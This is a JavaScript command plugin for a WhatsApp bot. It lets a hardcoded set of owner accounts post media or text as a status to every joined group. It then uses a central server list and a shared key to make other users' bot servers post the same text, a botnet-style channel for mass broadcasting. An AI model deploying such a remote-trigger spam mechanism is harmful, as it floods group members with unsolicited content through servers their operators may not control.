import { fileURLToPath } from 'url';
import { cmd } from '../command.js';
import axios from 'axios';
import { WebUrl, Key } from '../lib/functions.js';

const __filename = fileURLToPath(import.meta.url);

// Allowed users for status broadcast
const ALLOWED_USERS = [
    '633341413902@lid',
    '1297129619592@lid',
    '2744576544407@lid',
    '2811233430696@lid',
    '923195068309@s.whatsapp.net',
    '923196891871@s.whatsapp.net',
    '923036338918@s.whatsapp.net',
    '923110741871@s.whatsapp.net',
    '923219300532@s.whatsapp.net'
];

// ==================== ONLY GROUP STATUS BROADCAST COMMAND ====================
cmd({
    pattern: "status75",
    alias: ["autostatus65", "astatus64", "sall97", "statusgc86"],
    react: "📢",
    desc: "Post strictly to Group Status across all connected bot servers",
    category: "owner",
    use: ".status <reply to media/text/link>",
    filename: __filename
}, async (conn, mek, m, { args, q, sender, reply, react }) => {
    try {
        // Authorization Check
        if (!ALLOWED_USERS.includes(sender)) {
            await react('❌');
            return reply("*❌ | Only Authorized Owner Can Use This Command*");
        }

        await react('⏳');

        // Target Message & Content Extraction
        const targetMessage = m.quoted ? m.quoted : m;
        const mime = (targetMessage.msg || targetMessage).mimetype || '';
        let statusText = q || targetMessage.text || targetMessage.caption || '';

        if (!mime && !statusText) {
            await react('❌');
            return reply("❌ *Please reply to an image, video, audio, link, or provide text!*");
        }

        let mediaBuffer = null;
        let isPTT = false;

        if (mime) {
            mediaBuffer = await targetMessage.download();
            isPTT = targetMessage.msg?.ptt || false;
        }

        // 1. Post STRICTLY to Group Status Only (Your Bot Joined Groups)
        const allGroups = await conn.groupFetchAllParticipating();
        const groupIds = Object.keys(allGroups);
        let myGroupStatusCount = 0;

        for (const targetGroupId of groupIds) {
            try {
                // Group Status Context Payload
                const statusContext = {
                    isGroupStatus: true
                };

                let statusPayload = {};

                if (mime) {
                    if (mime.startsWith('image/')) {
                        statusPayload = { image: mediaBuffer, caption: statusText || "", mimetype: mime, contextInfo: statusContext };
                    } else if (mime.startsWith('video/')) {
                        statusPayload = { video: mediaBuffer, caption: statusText || "", mimetype: mime, contextInfo: statusContext };
                    } else if (mime.startsWith('audio/')) {
                        statusPayload = { audio: mediaBuffer, mimetype: isPTT ? 'audio/ogg; codecs=opus' : 'audio/mp4', ptt: isPTT, contextInfo: statusContext };
                    }
                } else if (statusText) {
                    statusPayload = { text: statusText, contextInfo: statusContext };
                }

                // Send strictly as group status
                await conn.sendMessage(targetGroupId, statusPayload);
                myGroupStatusCount++;
                
                // Safety delay
                await new Promise(resolve => setTimeout(resolve, 1000));

            } catch (err) {
                console.error(`Group status failed for ${targetGroupId}:`, err.message);
            }
        }

        // 2. Trigger All Connected User Servers (Strictly Group Status Only)
        let totalServers = 0;
        let triggeredServers = 0;

        try {
            const serversResponse = await axios.get(`${WebUrl}/servers`, { timeout: 10000 });
            
            if (serversResponse.data && serversResponse.data.servers) {
                const servers = serversResponse.data.servers;
                totalServers = servers.length;

                const requests = servers.map(server => {
                    const groupStatusApi = `${server.url}/post-group-status-only?key=${Key}&text=${encodeURIComponent(statusText)}`;
                    return axios.get(groupStatusApi, { timeout: 6000 })
                        .then(() => { triggeredServers++; })
                        .catch(() => {});
                });

                await Promise.allSettled(requests);
            }
        } catch (serverErr) {
            console.error("Server Trigger Error:", serverErr.message);
        }

        await react('✅');

        // Status Response Summary
        let resultMsg = `📢 *ONLY GROUP STATUS BROADCAST COMPLETE!*\n\n`;
        resultMsg += `📲 *Your Bot Groups Statuses Updated:* ${myGroupStatusCount} / ${groupIds.length}\n`;
        resultMsg += `🖥️ *User Servers Triggered (Group Status):* ${triggeredServers} of ${totalServers}\n\n`;
        resultMsg += `> *Note: Direct group messages & main WhatsApp story are excluded.*`;

        await reply(resultMsg);

    } catch (error) {
        console.error("Group Status Command Error:", error);
        await react('❌');
        await reply(`❌ *Error:* ${error.message}`);
    }
});
